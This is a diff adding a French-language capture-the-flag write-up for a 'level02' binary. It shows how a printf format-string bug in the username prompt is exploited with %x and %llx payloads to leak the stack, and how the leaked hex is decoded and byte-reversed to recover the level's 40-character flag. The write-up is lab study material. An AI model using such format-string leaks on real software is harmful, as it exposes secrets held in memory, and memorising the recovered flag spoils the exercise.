@@ -1,0 +1,32 @@
+# Apres review du code on voit que le program printf notre username
+# donc on peut voir simplement toute la stack avec des %x
+# le buffer ou est stocke le flag est stocke sur la stack, on va donc chercher ou il est avec des %x
+#
+# On sait qu'il est entre le buffer du username et le buffer du password
+#
+./level02
+--[ Username: 0000%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+--[ Password: 1111
+
+0000ffffe4d00312a2a2a2a2a2a2a2affffe6c8f7ff9a083131313100000000000003437684861733951574e67586e475873664b394d0303030307825782578257825782578257825782578257825 does not have access!
+
+# On voit notre  buffer du password (31313131) et notr buffer du username (30303030)
+# il reste donc le buffer du flag qui est au milieu
+# On cherche donc l'offset exact du debut du buffer
+
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+
+# Vu que c'est un binaire 64, on va devoir utiliser des %llx pour recupere tout nos caracteres.
+# 1 %llx nous donne 8 caracteres il va donc nous en falloir 5 pour faire les 40 caracteres du flag
+
+./level02
+--[ Username: %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x %llx%llx%llx%llx%llx
+--[ Password: a
+
+ffffe4d00612a2a2a2a2a2a2a2affffe6c8f7ff9a08610000000000000 756e50523437684845414a3561733951377a7143574e6758354a35686e47587348336750664b394d does not have access!
+
+# On va sur un site de conversion hexa/ascii : unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
+#
+# Cependant vu que on a recupere notre chaine en temps que nombre elle est en little endian, on va donc devoir reverse la string tous les 8 caracters (ce qui correspond au %llx)
+#
+# Hh74RPnu Q9sa5JAE XgNWCqz7 sXGnh5J5 M9KfPg3H
